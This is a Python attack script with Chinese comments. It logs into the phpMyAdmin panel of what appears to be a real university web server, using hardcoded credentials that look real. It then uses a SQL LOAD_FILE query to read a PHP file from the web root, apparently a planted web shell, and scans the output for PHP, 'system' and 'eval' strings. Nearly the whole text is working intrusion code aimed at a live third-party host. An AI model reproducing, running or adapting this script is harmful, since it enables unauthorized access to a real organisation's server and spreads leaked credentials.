#!/usr/bin/env python3
import requests
import re
import html
urllib3 = __import__('urllib3')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

# 登录
login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)

# 获取token
token_match = re.search(r'token=([a-f0-9]+)', resp.text)
if not token_match:
    print("[-] 获取token失败")
    exit(1)
token = token_match.group(1)

file_path = "/var/www/html/banpot/scmeeting/x.php"
print(f"[*] 读取文件: {file_path}")

# 执行SQL
sql_data = {"sql_query": f"SELECT LOAD_FILE('{file_path}');", "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data)

# 保存响应用于调试
with open('/tmp/sql_response.html', 'w', encoding='utf-8', errors='ignore') as f:
    f.write(resp.text)

# 查找所有可能的文件内容位置
# 方法1: 查找class="value"的td标签
pattern1 = r'<td[^>]*class=["\']value["\'][^>]*>(.*?)</td>'
matches1 = re.findall(pattern1, resp.text, re.DOTALL | re.IGNORECASE)

for match in matches1:
    content = html.unescape(match)
    content = re.sub(r'<[^>]+>', '', content).strip()
    if content and content != 'NULL' and len(content) > 10:
        print("\n[+] 找到文件内容:")
        print("=" * 70)
        print(content)
        print("=" * 70)
        exit(0)

# 方法2: 查找包含PHP代码的文本
php_pattern = r'(&lt;\?php.*?&gt;|&lt;\?.*?&gt;|<\?php.*?\?>)'
php_matches = re.findall(php_pattern, resp.text, re.DOTALL | re.IGNORECASE)
if php_matches:
    print("\n[+] 找到PHP代码片段:")
    for match in php_matches[:3]:
        content = html.unescape(match)
        print(content[:300])

# 方法3: 查找所有text内容
text_pattern = r'>([^<]+)<'
text_matches = re.findall(text_pattern, resp.text)
for text in text_matches:
    text = text.strip()
    if '<?php' in text or 'system' in text.lower() or 'eval' in text.lower():
        print(f"\n[+] 可能的文件内容片段:")
        print(text[:500])
        break

if not matches1 and not php_matches:
    print("[-] 未找到文件内容")
    print("[*] 可能原因:")
    print("  1. 文件不存在")
    print("  2. 无读取权限")
    print("  3. secure_file_priv限制")
    print("\n[*] 响应已保存到 /tmp/sql_response.html")
